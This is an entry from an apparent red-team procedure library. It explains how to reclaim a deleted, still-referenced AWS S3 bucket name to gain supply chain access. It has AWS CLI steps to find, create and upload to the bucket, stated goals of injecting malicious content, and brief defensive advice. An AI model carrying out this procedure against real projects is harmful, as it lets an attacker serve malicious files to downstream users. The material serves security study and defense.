---
id: 123e4567-e89b-12d3-a456-426614174001
name: Reclaim-Abandoned-S3-Bucket-via-Global-Namespacing
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.867Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Supply Chain Compromise]]'
sub_techniques: []
tags:
  - s3-bucket-takeover
  - aws
  - supply-chain
commands:
  - '[[commands/aws-s3-mb-create-bucket]]'
  - '[[commands/aws-s3-ls-list-buckets]]'
  - '[[commands/aws-s3-cp-upload]]'
platforms:
  - AWS
  - Cloud
tools:
  - '[[tools/AWS-CLI]]'
skill_level: intermediate
impact_level: high
detection_risk: low
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Supply Chain Compromise]]'
---

# Reclaim Abandoned S3 Bucket via Global Namespacing

## Summary

This procedure exploits AWS S3's global bucket namespace to reclaim a deleted bucket name that remains referenced in external code, such as test scripts, allowing an attacker to control content served to downstream systems without authentication.

## Description

In scenarios like the Mapbox vulnerability, a company deletes an S3 bucket but does not release its globally unique name. Due to S3's design, anyone can create a new bucket with that exact name post-deletion. If the original bucket is still hardcoded in scripts (e.g., mason-repository's PostGIS tests), this enables supply chain compromise by serving malicious files. Prerequisites include AWS access and knowledge of the bucket name from public code repos. Expected outcome: Full control over the bucket for uploading payloads.

## Requirements

1. AWS account with S3 create permissions (no special creds for namespace exploit).
2. Identification of abandoned bucket name via code review (e.g., grep in GitHub repos).
3. AWS CLI installed and configured with access keys.

## Defense

Defensive measures and detection strategies:

- Release bucket names immediately upon deletion or use randomized names.
- Validate S3 sources in code with checksums or signed URLs.
- Monitor for unexpected bucket creations via AWS CloudTrail logs.

## Objectives

1. Gain unauthorized control over a referenced S3 bucket.
2. Enable injection of malicious content into dependent systems.
3. Establish persistence in supply chain dependencies.

## Instructions

### Step 1: Identify Target Bucket Name

**Context**: Scan public repositories for hardcoded S3 bucket references to find abandoned ones.

**Command** ([[commands/grep-search-bucket]]):
```bash
grep -r "s3://" /path/to/mason-repository --include="*.sh" | grep postgis
```

> This extracts bucket names like 'mapbox-postgis-data'. Expected output: List of referenced buckets.

### Step 2: Create Bucket to Reclaim Namespace

**Context**: Use AWS CLI to instantiate the bucket, exploiting the free namespace.

**Command** ([[commands/aws-s3-mb-create-bucket]]):
```bash
aws s3 mb s3://abandoned-bucket-name --region us-east-1
```

> Confirms creation if namespace is available. Expected output: "make_bucket: abandoned-bucket-name".

### Step 3: Verify and Upload Test Content

**Context**: Confirm control by listing and uploading a file.

**Command** ([[commands/aws-s3-ls-list-buckets]]):
```bash
aws s3 ls s3://abandoned-bucket-name
```

> Expected output: Empty directory listing.

**Command** ([[commands/aws-s3-cp-upload]]):
```bash
echo "POC Takeover" > poc.txt
aws s3 cp poc.txt s3://abandoned-bucket-name/
```

> Expected output: Upload complete, verifiable via download.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Supply Chain Compromise]] Supply Chain Compromise

### Sub-Techniques


## Commands Used

- [[commands/grep-search-bucket]]
- [[commands/aws-s3-mb-create-bucket]]
- [[commands/aws-s3-ls-list-buckets]]
- [[commands/aws-s3-cp-upload]]

## Tools Used

- [[tools/AWS-CLI]]

## Tags

- [[s3-bucket-takeover]]
- [[aws]]
- [[supply-chain]]
